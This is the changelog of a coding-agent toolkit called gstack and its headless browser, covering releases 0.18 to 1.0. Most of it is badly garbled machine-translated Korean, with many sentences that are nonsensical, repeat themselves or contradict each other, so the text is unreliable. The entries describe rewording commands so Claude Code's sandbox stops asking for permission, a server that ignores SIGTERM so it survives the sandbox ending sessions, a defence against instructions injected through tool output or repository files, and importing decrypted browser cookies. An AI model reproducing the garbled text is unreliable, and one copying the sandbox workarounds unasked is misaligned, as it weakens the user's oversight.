- `normalizeFileUrl()` 돕는 `fileURLToPath()` + `pathToFileURL()` from `node:url` — 결코 문자열-concat — 그래서 URL는 `%20` 같이 탈출하고 정확하게 암호로 고쳐 쓴 돌진 궤도 (`%2F..%2F`)는 Node outright에 의해 거절됩니다.
- 새로운 `TabSession.loadedHtml` 필드 + `setTabContent()` / `getLoadedHtml()` / `clearLoadedHtml()` 메소드. ASCII 수명주기 다이어그램 소스. `clear` 콜은 BEFORE 탐색 시작 (예를들면) 그래서 포스트 조미료는 나중에의 컨텍스트 리케이트 리케이트를 다시 부활시킬 수있는 stale 메타 데이터를 남길 수 없습니다.
- `BrowserManager.setDeviceScaleFactor(scale, w, h)`는 원자입니다: 입력을, 저장합니다 새로운 가치, 호출 `recreateContext()`는, 실패에 분야를 뒤집습니다. `currentViewport` 추적은 recreateContext 대신에 당신의 크기를 hardcoding 1280×720 보존합니다.
- `COMMAND_ALIASES` + `canonicalizeCommand()` + `buildUnknownCommandError()` + `NEW_IN_VERSION`는 `browse/src/commands.ts`에서 수출됩니다. 진실의 단 하나 근원 — 둘 다 서버 파견자 및 `chain` 사전 검증 수입품은 같은 장소에서 수입합니다. 사슬은 단계 당 `{ rawName, name }` 모양을 이용합니다 그래서 감사 통나무는 파견이 공명한 이름을 사용하는 동안 사용자 유형이 보존하는 것을 이해합니다.
- `load-html`는 `browse/src/token-registry.ts`에서 `SCOPE_WRITE`에 등록됩니다.
- 호기심의 검토 역사 : 3 Codex 컨설팅 (20 + 10 + 6 간격), DX 검토 (TTHW ~4min → <60s, Champion tier), 2 Eng review 패스. 세 번째 Codex 패스는 eng 패스를 놓은 `validateNavigationUrl`에 대한 4 통화 버그를 붙 잡았다. 모든 발견은 계획으로 접혔다.

## [1.0.0.0] - 2026-04-18

### 추가
- **v1 프롬프트 = 더 간단합니다.** 모든 기술 출력 (tier 2 and up)은 원스런 광택과 함께 첫 번째 사용의 기술 용어를 설명하고, outcome 용어에 대한 질문 ( "사용자가 어떤 휴식 ..." 대신 "이 엔드 포인트 idempotent?"), 그리고 문장을 짧은 및 직접 유지. 모든 사람에게 좋은 쓰기 - 뿐만 아니라 비 기술적인 민속. 엔지니어도 혜택을.
- **Power 사용자를 위한 Terse opt-out.** `gstack-config set explain_level terse`는 이전, 더 단단한 prose 작풍에 각 기술 뒤를 전환합니다 - no 광택, no outcome-framing 층. 이진 스위치는, 모든 기술을 통하여 지팡이를 전환합니다.
- **jargon 목록.** `scripts/jargon-list.json`의 repo유소유소 목록입니다. gstack 광택이 있는 용어는 gstack 광택이 있습니다. 목록에 있는 약관은 충분히 일반 영어를 가정합니다. PR를 통해 용어를 추가하십시오.
- **LOC README의 영수증을 현실로 표현합니다.**는 “600,000+ 생산 코드의 선”를 대체했습니다 2013-vs-2026 pro-rata를 가진 영웅은 논리 코드 변화에 다수, 공중 vs 개인 저장소에 관하여 정직한 caveats와 더불어, 튀겼습니다. 그것이 `scripts/garry-output-comparison.ts`에 있는 그것이라고 컴파일하는 스크립트는 [scc의](https://github.com/boyter/scc)를 사용하고 [scc의](https://github.com/boyter/scc)를 사용합니다. 익지않는 LOC는 아직도 `/retro`는 맥락을 위해 산출, 다만 no 더 긴 머리말을 출력합니다.
- **더 똑똑한 `/retro` 미터.** `/retro`는 이제, 커밋, PRs 병합된 기능으로 지도합니다. 논리 SLOC 추가된 논리는 다음을 옵니다, 그리고 익지않는 LOC는 맥락 전용으로 철거됩니다. 좋은 고침의 10개의 선이 비계의 10천의 선 보다는 더 적은 선박이 아닙니다.
- **첫 번째 실행에 신속한 업그레이드.** 이 버전으로 업그레이드하면, 실행되는 첫 번째 기술은 새로운 default 쓰기 스타일 또는 V0 prose with `gstack-config set explain_level terse`를 복원 할 것인지 묻는 것을 한 번 묻습니다. 한 번, 플래그 파일 게이트, 다시 묻지 마십시오.

### 변경
- **README 영웅이 재프레임.** No 더 많은 "일 당 10K-20K 선" 주장. 제품에 초점은 +를 제공 + 논리적인 코드 변화에 pro-rata 다수, 그 AI는 코드의 대부분을 씁니다. 점은 그것을 타자를 칩니다, 그것입니다 무엇 발송하는지.
- **힙합 재프레임.** "ship 10K+ LOC/day"을 AI-coding speed에서 ship 실제 제품으로 대체했습니다."

### 기여자
- 새로운 `scripts/resolvers/preamble.ts` 쓰기 스타일 섹션, 계층 ≥ 2 기술을 위해 주사. 기존 AskUserQuestion 형식 섹션과 컴파일 (구식 = 질문이 구조화되는 방법, 스타일 = 내부의 내용의 번 품질). Jargon 목록은 생성 된 SKILL.md `gen-skill-docs` 시간에서 구워 - 0 실행 비용, 편집 JSON 및 재생산.
- New `bin/gstack-config` validation for `explain_level` values. Unknown values print a warning and default to `default`. Annotated header documents the new key.
- `gstack-upgrade/migrations/v1.0.0.0.sh`의 새로운 원샷 업그레이드 마이그레이션, 기존 `v0.15.2.0.sh`/ `v0.16.2.0.sh` 패턴 일치. 플래그 파일 게이트.
- New throughput pipeline: `scripts/garry-output-comparison.ts` (scc preflight + author-scoped SLOC across 2013 + 2026), `scripts/update-readme-throughput.ts` (reads the JSON, replaces `<!-- GSTACK-THROUGHPUT-PLACEHOLDER -->` anchor), `scripts/setup-scc.sh` (OS-detecting installer invoked only when running the throughput script — scc is not a package.json dependency).
- README의 두 문자열 마커 패턴은 자체 업데이트 경로 파괴에서 파이프라인을 방지하기 위해 : `GSTACK-THROUGHPUT-PLACEHOLDER` (테이블 앵커) vs `GSTACK-THROUGHPUT-PENDING` (확산 누락 - 빌드 마커 CI 거부).
- V0 기숙사 부정적인 시험 — 5D 심리학 차원 (scope_식욕, 위험_tolerance, detail_환경, 자율성, 건축_care) 및 8개의 아치 유형 이름 (Cathedral Builder, 배 그것 Pragmatist, 깊은 기술, 맛 제작자, 솔로 연산자, 컨설턴트, W Hunteredge, Builder-Coach)는 과태 상태 기술 산출에서 나타나지 않아야 합니다. V0 기계장치 기숙사를 V2까지 유지하십시오.
- **파싱 개선 배는 V1.1.** 원래 고려된 범위 (위험, 침묵하는 결정 구획, 최대 3 단계 모자, 손가락으로 튀김 기계장치)는 3개의 기술설계 전망이 계획 원본 편집으로 닫힐 수 없는 구조상 간격을 드러낸 후에 `docs/designs/PACING_UPDATES_V0.md`에 추출되었습니다. V1.1는 진짜 V1 기본 자료로 그것을 위로 선택합니다.
- 디자인 doc: `docs/designs/PLAN_TUNING_V1.md`. 전체 리뷰 내역: CEO + Codex (×2 패스, 통합된 45 발견) + DX (TRIAGE) + Eng (×3 패스 - 마지막 패스 범위를 감소 드리기).

## [0.19.0.0] - 2026-04-17

### 추가
- **`/plan-tune` 기술 — gstack는 이제 귀중하게 찾는 것이 무엇인지 알게 될 수 있습니다.** 같은 AskUserQuestion에 응답을 유지한다면, 이 기술은 gstack를 요청할 때 가르침을 가르칩니다. "스탑은 변경 로그 폴란드어에 대해 요구"- gstack가 내려져서 그 시점에서 그것을 존중하고, 한 방향 문 (파괴, 건축 포크, 보안 선택)은 항상 안전이 선호되기 때문에 항상 물어 달라고 요청합니다. 일반 영어는 어디에나 있습니다. No CLI subcommand 구문을 memorize.
- **Dual-track 개발자 프로필.** gstack 빌드러(5개 크기: 범위 식욕, 위험 허용 오차, 세부 사항, 자율성, 건축 관리)로 인 gstack도 조용히 트랙을 추적합니다. `/plan-tune`는 양쪽과 틈으로 모두 보여줍니다. 작업이 자기 공제와 일치하지 않을 때 볼 수 있습니다. v1은 관찰 - no 기술이 프로필에 따라 행동을 변경합니다. 즉, v2에서 입증 된 프로필이 있습니다.
- **Builder 아카이브.** 실행 `/plan-tune vibe` (v2) 또는 기술이 차원에서 그것을 infer하게 하십시오. 8개의 지명한 archetypes (Cathedral Builder, Ship-It Pragmatist, Deep Craft, Taste Maker, Solo 연산자, Consultant, Wedge Hunter, Builder-Coach) 플러스 Polymath fallback 당신의 차원이 표준 패턴을 맞지 않을 때. Codebase 및 모형 배 지금; 사용자 파싱 명령은 v2입니다.
- **인라인 `tune:` 각 gstack 기술에 대한 피드백.** 기술이 뭔가를 묻을 때, `tune: never-ask` 또는 `tune: always-ask` 또는 자유로운 모양 영어 및 gstack를 응답할 수 있습니다. 단지 `gstack-config set question_tuning true`를 통해 선택될 때만 실행하십시오 — 그 때까지 영 충격.
- **프로필 - 포이팅 방어.** 인라인 `tune:`는 미리 고침이 도구 출력, 파일 내용, PR 묘사에서 결코 얻은 경우에만 받아들여집니다, 또는 다른 어디에서 악의 repo는 지시를 주사할지도 모릅니다. 이진은 출구 코드 2로 이 쓰기를 위해 이 적용합니다. 이것은 Codex 검토에서 외부 음성 붙잡음이었습니다; 그것은 일에서 구워집니다.
- **CI 시행에 따라 지정된 질문 등록.** 53 15가지 기술에 걸쳐 AskUserQuestion 카테고리를 재순환하고 있습니다. `scripts/question-registry.ts`는 안정된 ID, 카테고리, 문형(편도 대 2방향), 옵션으로 선언됩니다. CI 테스트는 스키마가 유효하게 유지됩니다. 안전-신문(파괴, 건축 포크)은 `one-way`를 선언하여 선언 사이트에서 분류됩니다.
- **통합 개발자 프로필.** `/office-hours` 기술의 기존 빌더-profile.jsonl (제목, 신호, 자원, 주제)는 첫 번째 사용에서 단일 `~/.gstack/developer-profile.json`로 접힙니다. 마이그레이션은 원자, 불포화이며 소스 파일을 아카이브합니다. 안전하게 재시작하십시오. 레거시 `gstack-builder-profile`는 새로운 이진에 위임하는 얇은 shim입니다.

### 기여자
- 새로운 `docs/designs/PLAN_TUNING_V0.md`는 전체적인 디자인 여행을 캡처합니다: pros/cons, 명시된 합격 기준을 가진 v2에 얽혀진 무슨, Codex 검토 후에 거절된 무슨 (substrate-as-prompt-convention, ±0.2 죔쇠, preamble LANDED 탐지, 단 하나 event-schema), 그리고 마지막 모양이 함께 왔다는 것을. 왜 제약이 존재하는지 이해하기 위하여 v2에 작동하기 전에 이것을 읽으십시오.
- 세 가지 새로운 배양 : `bin/gstack-question-log` (질문에 부합), `bin/gstack-question-preference` (사용자 -origin 문이있는 넓은 기본 상점), `bin/gstack-developer-profile` (최고의 gstack-builder-profile; 지원 --읽기, --migrate, --derive, --profile, --gap, --trace, --check-mismatch, --vibe).
- `scripts/resolvers/question-tuning.ts`: 질문 기본 체크 (각 AskUserQuestion), 질문 로그 (after), 사용자 리긴 문 지시에 대한 인라인 조정 의견. 계층을 위한 1개의 콤팩트 `generateQuestionTuning` 단면도로 통합 >= 2개의 기술이 token 머리 위를 극소화하는.
- Hand-crafted Psychic Signal map (`scripts/psychographic-signals.ts`) 버전 해시와 함께 자동으로 gstack 버전 사이의지도가 변경 될 때 프로파일 재컴퓨트를 캐시했습니다. 9 신호 키 범위를 덮는 - 필적, 아키텍처 - 관리, 테스트 - 디펜, 코드 - 품질 - 관리, 세부 - 환경, 디자인 - 관리, devex-care, 유통 - 관리, 세션 모드.
- 키워드-fallback one-way-door classifier (`scripts/one-way-doors.ts`) - 레지스트리에 나타나지 않는 광고 - 호크 질문 ID에 대한 보조 안전 층. 기본 안전은 레지스트리 선언입니다.
- 테스트 파일에 대한 118 새로운 테스트 : `test/plan-tune.test.ts` (47 테스트 - 스키마, 도우미, 안전, 클래스터, 신호지도, 아카이브 유형, 사전 조립 주입, 엔드 투 엔드 파이프), `test/gstack-question-log.test.ts` (21 테스트 - 유효 탑재량, 불량 지급 하중, 주입 방위), `test/gstack-question-preference.test.ts` (31 테스트 - check/write/read/clear/stats + 사용자 리긴 게이트 + 스키마 유효성 검사), `test/gstack-developer-profile.test.ts` (25 테스트 - read/migrate/derive/trace/gap/vibe/check-mismatch). Gate-tier E2E 테스트 `skill-e2e-plan-tune.test.ts` 등록 (`bun run test:evals`에 실행).
- 외부 청구서 검토에 의해 구동 범위 롤백. 초기 CEO EXPANSION 계획은 심리학 자동 결정 + 블라인드 스포크 코치 + LANDED 축하 + 전체 기판 배선을 번들었습니다. Codex의 20-point critique는 유형의 질문 레지스트리없이 잡았다, "substrate"는 마케팅이었다; E1/E4/E6는 논리적 금전을 형성했습니다; 단면도 중독은 비난되지 않았습니다; <7ph>는 모든 부작용을 허용했습니다. v1는 schema + 관측 층을 발송합니다, v2는 기초가 내구재를 증명한 후에 행동 적응을 추가합니다. 모든 6개의 확장은 P0로 지정된 합격 기준을 가진 TODOs 추적됩니다.

## [0.18.4.0] - 2026-04-18

### 고정
- **Apple 실리콘 no는 첫 번째 실행에 SIGKILL로 더 오래 죽는다.** `./setup`는 이제 `bun run build`가 끝난 이진을 각 컴파일한 후에 `bun run build`를 마다 합니다. gstack를 복제하고 `zsh: killed ./browse/dist/browse`를 보면서, 이 이유입니다. @voidborne-d (#1003)로 감사를 위해 Bun `--compile` 링크커 서명 문제점을 추적하고 시험한 고침 (6개의 시험 4개의 궤적, 방어적인 플랫폼의 맞은편에 발송하십시오.
- **`/codex` no 더 긴 Claude Code의 Bash 도구에서 영원히 걸린다.** Codex CLI 0.120.0는 stdin deadlock를 소개했습니다: stdin가 비TTY 관 (Claude Code, CI, 배경 bash, OpenClaw), `codex exec`가 EOF를 위해 그것을 `<stdin>` 구획으로 묶기 위하여, 비록 시선 인자로 통과될 때. 증상: `codex exec` `codex review`에서 `codex review` 출력 `codex review` `codex review` `<stdin>` `<stdin>` 출력 `<stdin>` `<stdin>` `<stdin>`를 출력하십시오. `/autoplan`, 각 계획 검토 외부 음성, `/ship` adversarial, 그리고 `/review` adversarial는 전부 막을 풉니다. 13 분 repro와 최소한도 고침을 위한 @loning (#972)에 감사.
- **`/codex`와 `/autoplan`는 Codex auth가 누락되거나 끊기 때 빠르지 않습니다.** 이 릴리스 전에, llogging-out Codex 사용자는 기술 지출 분을 지상에 비싸게 만드는 것을 보고합니다 auth 과실 중간 교류. 이제 다 신호 probe (`$CODEX_API_KEY`, `$OPENAI_API_KEY`, 또는 `${CODEX_HOME:-~/.codex}/auth.json`)를 통해 기술 preflight `codex login` 또는 놓인 `$CODEX_API_KEY`” 어떤 메시지든지를 가진 중지합니다: 신속한 건설의 앞에: 신속한 배치. Codex CLI가 알려진 벌레 버전 (현재 0.120.0-0.120.2)에 있다면, 당신은 한 줄의 판결을 업그레이드 할 수 있습니다.
- **`/codex`와 `/autoplan` no는 모형 API가 흘러나면 0% CPU에 더 긴 앉습니다.** 각 `codex exec`/ `codex review`는 `gtimeout → timeout → unwrapped` fallback chain을 가진 10 분 시간 포장지의 밑에 지금 실행합니다, 그래서 당신은 10 분을 지나서 쌓아진 명확한 "Codex를 얻습니다. 일반적인 원인: 모형 API 찰상, 긴 신속한, 네트워크 문제점. re-running를 시도하십시오." 무한한 대기 대신 메시지. `./setup` 자동 설치 `coreutils` 에 macOS 그래서 `gtimeout`는 `GSTACK_SKIP_COREUTILS=1`를 위해 CI/실크 기계에 `coreutils`를 가진 스키를 유효합니다.
- **`/codex` 도전 모드는 이제 auth 오류를 침묵으로 삭제합니다.** 도전 모드는 stderr에서 `/dev/null`로 배관되어, 실행 중의 auth 실패를 마친다. 이제 stderr를 임시 파일로 캡처하고 `auth|login|unauthorized` 패턴을 확인합니다. Codex 오류가 중간 실행되면, 그것을 볼 수 있습니다.
- **플랜 리뷰 no 더 이상 조용히 bias를 최소 난로 권고에.** `/plan-ceo-review`와 `/plan-eng-review`는 "minimal diff"를 목록으로 사용했습니다. "rewrite는 보장될 때 벌금이 붙을 때" 주의를 기울입니다. 검토자는 그 위에 선택하고 승인되어야 하는 rewrites를 거부했습니다. 선호도는 "right-size diff"로 지금 분할될 때 재쓰기를 추천하는 허가를 가진 짜맞춰집니다. CEO 리뷰에서 구현 대안은 동일 중량의 선명도를 얻었다. default가 작기 때문에 최소한의 비할 수 없다.

### 기여자
- 새로운 `bin/gstack-codex-probe`는 auth probe, 버전 체크, 타임아웃 래퍼 및 `/codex` 및 `/autoplan` 둘 소스가 있는 1개의 bash 돕기로 끼워넣습니다. 두 번째 외부 청구서 백엔드 땅 (Gemini CLI)가 확장될 파일인 경우에.
- `test/codex-hardening.test.ts`는 probe (8 auth probe 조합, 10 버전 regex 케이스를 포함하여 `0.120.10` 거짓 적당한 감시, 4 시간 포장지 + 명 공간 위생 검사, 3개의 telemetry payload schema 체크를 위한 새로운 `test/codex-hardening.test.ts` 선박 25의 세련한 단위 시험 발송합니다 `0.120.10`를 포함하여 3개의 타당성 검사를 검사합니다. 자유로운 층, <5s 런타임.
- `test/skill-e2e-autoplan-dual-voice.test.ts` (기간표)는 `/autoplan` 이중 송장 경로에 문. Claude subagent와 Codex 음성 출력을 단계 1, OR에서 `[codex-unavailable]`가 복종될 때 기록됩니다. 주기적인 ~= $1/run는 문이 아닙니다.
- Codex 고장 전도 사건 (`codex_timeout`, `codex_auth_failed`, `codex_cli_missing`, `codex_version_warning`)는 기존 사용자 선택에서 `~/.gstack/analytics/skill-usage.jsonl`에 있는 지금 땅에 놓습니다. 신뢰성 회귀는 사용자 기초 가늠자에 가시적입니다.
- Codex 타임아웃 (`exit 124`) 이제 `gstack-learnings-log`를 통해 자동 로그인 작동 학습. 같은 기술 /branch 표면의 /branch 세션은 자동으로 걸린다.

## [0.18.3.0] - 2026-04-17

### 추가
- **Windows cookie 수입.** `/setup-browser-cookies` now works on Windows. Point it at Chrome, Edge, Brave, or Chromium, pick a profile, and gstack will pull your real browser cookies into the headless session. Handles AES-256-GCM (Chrome 80+), DPAPI key unwrap via PowerShell, and falls back to a headless CDP session for v20 App-Bound Encryption on Chrome 127+. Windows users can now do authenticated QA testing with `/qa` and `/design-review` for the first time.
- **One-command OpenCode 설치.** `./setup --host opencode`는 Claude Code와 Codex를 위해 동일한 방법을 가진 OpenCode를 위한 gstack 기술을 위로 철사를. No 수동 작업대.

### 고정
- **No 모든 기술 invocation에 대한 권한이 더 신속하게 발생했습니다.** Every `/browse`, `/qa`, `/qa-only`, `/design-review`, `/office-hours`, `/canary`, `/pair-agent`, `/benchmark`, `/land-and-deploy`, `/design-shotgun`, `/design-consultation`, `/design-html`, `/plan-design-review`, and `/open-gstack-browser` invocation used to trigger Claude Code's sandbox asking about "tilde in assignment value." Replaced bare `~/` with `"$HOME/..."` in the browse and design resolvers plus a handful of templates that still used the old pattern. 모든 기술이 자동으로 실행됩니다.
- **멀티 스텝 QA 실제로 작동.** The `$B` browse server was dying between Bash tool invocations. Claude Code's sandbox kills the parent shell when a command finishes, and the server took that as a cue to shut down. Now the server persists across calls, keeping your cookies, page state, and navigation intact. Run `$B goto`, then `$B fill`, then `$B click` in three separate Bash calls and it just works. A 30-minute idle timeout still handles eventual cleanup. `Ctrl+C` and `/stop` still do an immediate shutdown.
- **쿠키 피커는 UI를 좌초시킵니다.** CLI 시작 CLI 종료 중, 픽업 페이지는 `Failed to fetch` 서버가 그것을 종료했기 때문에 플래시합니다. 검색 서버는 이제 어떤 피커 코드나 세션이 살고있는 동안 살아남을 수 있습니다.
- **OpenClaw 기술 부하는 Codex에서 청결하게 적재합니다.** 4개의 손 착용된 클로후프 기술 (ceo-review, 조사, 사무실 시간, 복고풍)는 끊임없이 파서가 거절한 unquoted 식민지와 비표준 `version`/`metadata` 분야를 가진 frontmatter를 비치하고 있었습니다. 이제 그들은 Codex CLI에 과실 없이 적재하고 GitHub에서 정확하게 만듭니다.

### 기여자
- 커뮤니티 파 땅 6 PRs: #993 (비리랩), #994 (졸록), #996 (비폭스드), #864 (cathrynlavery), #982 (breakneo), #892 (msr-hickory).
- SIGTERM 처리는 이제 모드 인식입니다. 정상적인 모드에서는 SIGTERM를 무시합니다. Claude Code의 sandbox는 중간에 얽혀 있지 않습니다. headed 모드 (`/open-gstack-browser`) 및 터널 모드 (`/pair-agent`) SIGTERM는 여전히 깨끗한 폐쇄를 유발합니다. 그 모드는 모드를 건너 뛰기 때문에 모드 나판 데몬이 영원히 축적됩니다. `BROWSE_HEADED=1`는 `BROWSE_HEADED=1`를 사용하도록 요청할 수 있습니다. `BROWSE_HEADED=1`는 `BROWSE_HEADED=1`를 사용해서는 안됩니다.
- Windows v20 App-Bound Encryption CDP fallback은 이제 Chrome 버전을 입력하고 디버그 포트 보안 자세 (127.0.0.1-only, [9222, 9321] 충돌 방지를 위해 임의 포트를 문서화하는 인라인 코멘트를 가지고 있습니다.
- 새로운 회귀 시험 `test/openclaw-native-skills.test.ts` 핀 OpenClaw 기술 frontmatter에 `name` + `description`만. 붙잡는 버전/metadata PR 시간에 편류.

## [0.18.2.0] - 2026-04-17

### 고정
- **`/ship`는 시간의 `/document-release` ~80%를 건너 멈춥니다.** 오래된 단계 8.5는 Claude에 `cat`에 *후후후*에 *후후후* PR URL가 이미 산출되었습니다, 모형이 상황에 있는 중간 도구 산출의 500-1,750의 선이 있었습니다 그것의 적어도 지적인이었습니다. `/ship`는 PR를 신선한 컨텍스트 창에서 실행하는 에이전트으로 파견합니다. *의 전*를 만들기 때문에 `## Documentation` 섹션은 생성하에 편집 춤 대신 초기 PR 몸으로 구워집니다. 결과: 문서는 실제로 모든 배에 동기화합니다.

### 변경
- **`/ship`의 4개의 무거운 잠수함은 격리한 에이전트 상황에 달려 있습니다.** 적용 감사 (Step 7), 계획 완료 감사 (Step 8), Greptile 삼위 (10 단계), 및 문서 동기화 (Step 18) 각 신선한 컨텍스트 창을 얻는 데 에이전트을 파견. 부모는 결론을 볼 (JSON), 중간 파일이 읽지 않는. 이것은 패턴 Anthropic의 "Using Claude Code: 세션 관리 및 1M Context"를 위해 블로그에 대한 포스트를 권장: "이 도구가 다시 출력하거나 결론을 내릴 필요합니까? 결론이 끝나면 미시 결정을 사용하십시오."
- **`/ship` 단계 수는 분수 (`3.47`, `8.5`, `8.75`) 대신 1-20를 청소합니다.** 분수 단계 번호는 모형에 "선택적인 부록"를 신호하고 말단 단계에 뚜렷하게 공헌했습니다. 청결한 부지깽이는 필수 느낍니다. 진짜로 배열되는 (Plan Verification 8.1, Scope Drift 8.2, 검토 육군 9.1/9.2, 십자검출 9.3)가 보존됩니다.
- **`/ship` 이제는 푸시 후 "당신은 NOT 완료"를 인쇄합니다.** 모델이 미션을 연마하고 doc 동기화 + PR 생성을 건너 뛰는 branch를 추진하고 있는 천연 스토핑 포인트를 끊습니다.

### 기여자
- `test/skill-validation.test.ts`의 새로운 회귀 가드는 분수 단계 수로 뒤를 막고 `/ship`와 `/review` 결의 조건 사이 교차 오염을 붙잡습니다.
- 배 템플릿 구조: 이전 단계 8.5 (post-PR doc sync with `cat` delegation) 새로운 단계 18 (pre-PR subagent 파견으로 대체하여 CHANGELOG clobber 보호, doc exclusions, risky-change gate, 및 race-safe PR body edit). Codex는 원래 계획의 재조정을 떨어졌다는 것을 `/document-release` 읽는 것 `/document-release` .

## [0.18.1.0] - 2026-04-16

### 고정
- **`/open-gstack-browser` 실제로 지금 열려 있습니다.** `/open-gstack-browser` 또는 `$B connect` 그리고 브라우저가 약 15초 후 사라졌을 경우, 검색 서버 내부의 watchdog는 CLI 프로세스를 파고, CLI 종료 (그런데, 브라우저를 실행한 후 바로), watchdog는 "orphan!"라고 말했으며 모든 것을 죽였다. The fix disables that watchdog for headed mode, both in the CLI (always set `BROWSE_PARENT_PID=0` for headed launches) and in the server (skip the watchdog entirely when `BROWSE_HEADED=1`). Two layers of defense in case a future launcher forgets to pass the env var. Thanks to @rocke2020 (#1020), @sanghyuk-seo-nexcube (#1018), @rodbland2021 (#1012), and @jbetala7 (#986) for independently diagnosing this and sending in clean, well-documented fixes.
- **headed 브라우저 창을 닫아 이제 제대로 정리합니다.** 이 릴리스 전에, GStack 브라우저 창에서 X를 클릭하고 서버의 정리 routine를 건너 직접 프로세스를 종료했습니다. 즉, 죽은 서버, 비난 채팅 세션 상태, 왼쪽 Chromium 프로필 잠금을 파는 stale sidebar-agent 프로세스 뒤에 왼쪽 (이 경우 "사용에서 프로파일을 생성하는" 오류가 다음 `$B connect`), stale `browse.json` 상태 파일에 있습니다. 이제 전체 `shutdown()` 경로를 통해 단선 핸들러 경로가 먼저 청소하고 모든 것을 청소하고 코드 2로 종료합니다 (현재는 충돌에서 사용자 닫히는 것을 구별합니다).
- **CI/Claude Code Bash 호출은 이제 지속 headless 서버로 공유할 수 있습니다.** headless는 CLI의 PID를 감시 목표로, `BROWSE_PARENT_PID=0`를 당신의 환경에 놓을 때도 강제하는 `BROWSE_PARENT_PID=0`로 하드 코드에 사용된 종단 경로. 이제 `BROWSE_PARENT_PID=0 $B goto https://...`는 서버가 부족한 CLI invocations를 통해 살아남을 것을, 어떤 다단계 워크플로 (CI 모조, Claude Code's Bash's Bash는, 실제로 선택했습니다.
- **`SIGTERM` / `SIGINT` 종료가 1 대신 코드 0으로 종료됩니다.** /ship의 권고 중첩된 회귀: `shutdown()`가 `exitCode` 인수를 받아 들일 때, Node의 신호 청취자는 신호 이름 (`'SIGTERM'`)를 출구 코드로, 이는 `NaN`에 응하고 `1`를 사용했습니다. 청취를 감싸는 것은 `shutdown()`를 no args로 칭합니다. `Ctrl+C`를 다시 닫습니다.

### 기여자
- `test/relink.test.ts` no 더 긴 병렬 시험 짐의 밑에 가짜. 그 파일에 있는 23의 시험은 `gstack-config` + `gstack-relink` (현금 subprocess 일), 그리고 `bun test`에서 다른 스위트 달리기와 더불어, 각 시험에 의하여 편류된 ~200ms 과거 Bun의 5s 과태를 풉니다. `test`에 default에 `Object.assign`를 가진 15s에 시험 시간 초과 `Object.assign` `.only` sub`.only`를 감싸였습니다. `test`에 default를 `Object.assign`를 가진 15s에 시험하십시오.
- `BrowserManager`는 `onDisconnect` 콜백 (`server.ts`에서 `shutdown(2)`로 전선)을 얻었으며, 단선 핸들러에서 `process.exit(2)`를 대체합니다. 콜백은 try/catch + Promise rejection Handling으로 감싸고 있어, 나머지 브라우저에 부착된 라이브 서버를 떠나는 대신 프로세스를 다시 삽입합니다.
- `shutdown()` 이제는 단선 경로 (예: 2) 및 신호 경로 (default 0)에 의해 사용되는 선택적인 `exitCode: number = 0` 모수를 받아들입니다. 동일한 정리 코드, 2개의 외침 위치, 명백한 출구 코드.
- `BROWSE_PARENT_PID` `cli.ts`에서 파싱은 `server.ts`: `parseInt` 대신 엄격한 끈 평등의, 그래서 `BROWSE_PARENT_PID=0\n` ( 포탄 `export`에서 금지) 명예를 받습니다.

## [0.18.0.1] - 2026-04-16

### 고정
- **Windows install no 더 긴 빌드 오류가 실패합니다.** If you installed gstack on Windows (or a fresh Linux box), `./setup` was dying with `cannot write multiple output files without an output directory`. The Windows-compat Node server bundle now builds cleanly, so `/browse`, `/canary`, `/pair-agent`, `/open-gstack-browser`, `/setup-browser-cookies`, and `/design-review` all work on Windows again. If you were stuck on gstack v0.15.11-era features without knowing it, this is why. @tomasmontbrun-hash (#1019) 및 @scarson (#1013)에 대한 감사는 독립적으로이 다운을 추적하고, #1010 및 #960에 이슈 리포트에.
- **CI 녹색 빌드에 대해 lying 중지합니다.** `build`와 `test` 스크립트는 `package.json`의 `|| true`를 덮는 쉘 precedence 함정을 *의 모든* 명령 사슬에서 삼키는 실패, 단지 정리 단계는 그것을 의미하지 않았습니다. 그것은 Windows가 첫번째 장소에 발송된 버그를 건설하는 방법 입니다. CI는 구조, 실패한 구조 및 CI는 어떤 실패든지 보고했습니다. CI는 실제로 시험의 실패를 시험하고 실패합니다. Windows는 실제로 시험의 실패를 시험하고 실패합니다. CI는 실제로 시험의 실패를 시험합니다.
- **`/pair-agent` 에 Windows 표면 설치 시간에 문제를 설치, 터널 시간.** `./setup`는 Node를 Windows에 `@ngrok/ngrok`를, 이미 Playwright를 위해 한 것처럼 적재할 수 있습니다. 기본 바이너리가 설치되지 않은 경우, 에이전트를 페어링하려고 처음에 발견하십시오.

### 기여자
- `browse/test/build.test.ts`는 `server-node.mjs`를 잘 변형한 ES 단위 구문이고 `@ngrok/ngrok`는 실제로 외부로 (대략되지 않음)이었습니다. no의 앞에 놓이는 경쾌한 건너뛰기.
- `browse/scripts/build-node-server.sh`에 대한 정책 코멘트를 추가하면, 왜 의존도를 외부화하는지 설명합니다. 만약 당신이 기본 addon 또는 동적 `await import()`로 dep를 추가하면, 코멘트는 어디에서 플러그인을 꽂는지 알려줍니다.

## [0.18.0.0] - 2026-04-15

### 추가
- **Confusion Protocol의 특징** 모든 워크플로 기술은 현재 인라인 주변 게이트가 있습니다. Claude가 두 가지 방법으로 갈 수 있는 결정이 표시됩니다. (건축? 어떤 데이터 모델? 결함 범위와 파괴적인 작동?), 그것은 추측과 추측 대신 묻습니다. 높 흡입 결정에 Scoped, 그래서 그것은 루틴 코딩 느리지 않습니다. Karpathy의 #1 AI 코딩 실패 모드에 대한 주소.
- **Hermes 호스트 지원.** gstack는 [Hermes 에이전트](https://github.com/nousresearch/hermes-agent)를 적절한 도구로 바꿔 놓는 `terminal`, `read_file`, `patch`, `delegate_task`)를 위한 기술 문서 생성. `./setup --host hermes`는 통합 지시를 인쇄합니다.
- **GBrain 호스트 + 뇌 첫 번째 해결자.** GBrain is a "mod" for gstack. When installed, your coding skills become brain-aware: they search your brain for relevant context before starting and save results to your brain after finishing. 10 skills are now brain-aware: /office-hours, /investigate, /plan-ceo-review, /retro, /ship, /qa, /design-review, /plan-eng-review, /cso, and /design-consultation. Compatible with GBrain >= v0.10.0.
- **GBrain v0.10.0 통합.** Agent Instruction는 `gbrain query` (expensive Hybrid) 대신 `gbrain search` (fast keyword lookup)를 사용합니다. 각 명령은 CLI, `--tags`, 그리고 heredoc 예제와 함께 전체 CLI 구문을 보여줍니다. 키워드 추출 지침은 에이전트가 효과적으로 검색하는 데 도움이됩니다. Entity enrichment auto-creates stub 페이지는 기술 출력에 언급했습니다. 스로틀 오류는 소원이 감지하고 처리 할 수 있습니다. 뇌가 해지면 검사를 실패한 세션 시작과 이름에서 전혈 건강 검사가 `gbrain doctor --fast --json`를 실행합니다.
